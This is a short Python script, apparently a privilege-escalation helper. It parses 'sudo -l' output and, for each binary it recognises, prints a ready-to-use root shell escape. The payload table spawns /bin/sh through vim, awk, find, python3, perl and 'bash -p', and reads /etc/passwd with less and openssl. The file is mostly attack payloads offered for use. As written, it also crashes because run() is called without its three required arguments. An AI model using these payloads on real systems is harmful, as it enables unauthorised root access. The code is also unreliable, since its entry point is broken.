import sys
import re

# ==============================
# RULES (EASY TO EXTEND)
# ==============================

RULES = {
    "vim": {
        "payload": "sudo vim -c ':!/bin/sh'",
    },
    "less": {
        "payload": "sudo less /etc/passwd  # then !sh",
    },
    "awk": {
        "payload": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
    },
    "find": {
        "payload": "sudo find . -exec /bin/sh \\; -quit",
    },
    "bash": {
        "payload": "sudo bash -p",
    },
    "python3": {
        "payload": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
    },
    "perl": {
        "payload": "sudo perl -e 'exec \"/bin/sh\";'",
    },
    "openssl": {
        "payload": "sudo openssl enc -in /etc/passwd",
    },
}

# ==============================
# HELPERS
# ==============================

def extract_binaries(text):
    """
    Extracts binary paths from sudo -l output OR raw input
    """
    lines = text.strip().split("\n")
    binaries = []

    for line in lines:
        # Match /usr/bin/xxx
        matches = re.findall(r"(/[\w/.\-]+)", line)
        binaries.extend(matches)

    return list(set(binaries))


def classify(binary):
    name = binary.split("/")[-1]

    if name in RULES:
        return ("exploit", RULES[name])
    else:
        return ("unknown", None)


def detect_flags(text):
    flags = []

    if "NOPASSWD" in text:
        flags.append("NOPASSWD")

    if "(ALL : ALL) ALL" in text:
        flags.append("FULL_ROOT")

    return flags


# ==============================
# MAIN
# ==============================

def run(data, cred, args):
    print("[*] Paste sudo -l output OR binary path (Ctrl+D to finish):\n")

    data = sys.stdin.read()

    binaries = extract_binaries(data)
    flags = detect_flags(data)

    # ==============================
    # FLAGS
    # ==============================
    if flags:
        print("\n[!] FLAGS DETECTED:\n")
        for f in flags:
            if f == "NOPASSWD":
                print("[!] NOPASSWD → no password required")
            elif f == "FULL_ROOT":
                print("[!] FULL ROOT → sudo su")

    # ==============================
    # ANALYSIS
    # ==============================
    print("\n[+] ANALYSIS:\n")

    for binary in binaries:
        category, rule = classify(binary)

        if category == "exploit":
            print(f"[+] {binary}")
            print("    → exploitable")
            print(f"    → payload: {rule['payload']}\n")

        else:
            print(f"[!] {binary}")
            print("    → unknown")
            print("    → check GTFOBins\n")


if __name__ == "__main__":
    run()
